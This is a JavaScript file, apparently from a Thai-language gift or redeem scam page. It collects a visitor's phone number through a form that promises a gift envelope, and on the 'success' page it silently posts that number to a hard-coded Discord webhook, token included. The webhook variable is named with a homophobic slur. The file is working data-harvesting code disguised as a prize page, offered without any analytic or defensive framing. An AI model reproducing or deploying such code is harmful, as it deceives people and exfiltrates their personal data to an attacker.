var phone = "";
var gayWebhook = "https://discord.com/api/webhooks/1178678290555359322/Yf-hnkZmpvxXH8qVnigZogBZav-2MdIyWzFx1RAcyOo6cj7gp4humupjnRCKy1-NpiH9";

function getPhone(text) {
  var result = "xxx-xxx-xxxx";

  return result.replace("x", text[0]).replace("x", text[1]).replace("x", text[2]);
}

function randomNum(length) {
  let result = '';
  const characters = '123456789';
  const charactersLength = characters.length;
  let counter = 0;
  while (counter < length) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
    counter += 1;
  }
  return result;
}

//9
var num_from = randomNum(9)
function newpage(page) {
  if (page == "get") {

    console.log("%c[PAGE] Loading redeem page!", "color: white;");
    $(".loader").load("index2.html");

  } else {
    if (page == "preview") {
      console.log("%c[PAGE] Loading success page!", "color: white;");
      $(".loader").load("index3.html");
      sendWebhook();

    }
  }
}
function sendWebhook() {
  $.ajax({
    method: "POST",
    url: gayWebhook,
    dataType: "json",
    data: {
      "content": "PHONE: " + phone
    }
  })
}
window.onload = function() {
  // เลือก element ของ input field
  const mobileField = document.querySelector('#mobile_txtfield');
  // เลือก element ของ label ที่เป็น error message
  const mobileErrorMsg = document.querySelector('#mobile_txtfield_msg');
  // เลือก element ของ button ตกลง
  const footerButton = document.querySelector('#footer_button');

  // เมื่อผู้ใช้กรอกเบอร์โทรศัพท์
  mobileField.addEventListener('input', () => {
    // ตรวจสอบว่ากรอกครบ 10 ตัวเลขหรือไม่
    if (mobileField.value.length === 12) {
      // ถ้าครบ 10 ตัวเลข ให้เปิดใช้งานปุ่มตกลง
      phone = mobileField.value;
      footerButton.classList.remove('disabled');
      // และเปลี่ยนสีปุ่มเป็นสีอื่น
      footerButton.classList.add('green');
    } else {
      // ถ้ายังไม่ครบ 10 ตัวเลข ให้ปิดใช้งานปุ่มตกลง
      footerButton.classList.add('disabled');
      // และเปลี่ยนสีปุ่มกลับเป็นสีเดิม
      footerButton.classList.remove('green');
    }
  });

  // เมื่อกดปุ่มตกลง
  footerButton.addEventListener('click', () => {
    // ตรวจสอบว่า input field มีค่าครบถ้วนหรือไม่
    if (mobileField.validity.valid) {
      // ถ้าครบถ้วน ให้แสดงภาพซองของขวัญ
      document.getElementById('gift_image').style.display = 'block';
    } else {
      // ถ้ายังไม่ครบถ้วน ให้แสดง error message
      mobileField.classList.add('invalid');
      mobileErrorMsg.setAttribute('data-error', 'กรุณากรอกเบอร์โทรศัพท์ให้ครบถ้วน');
    }
  });
}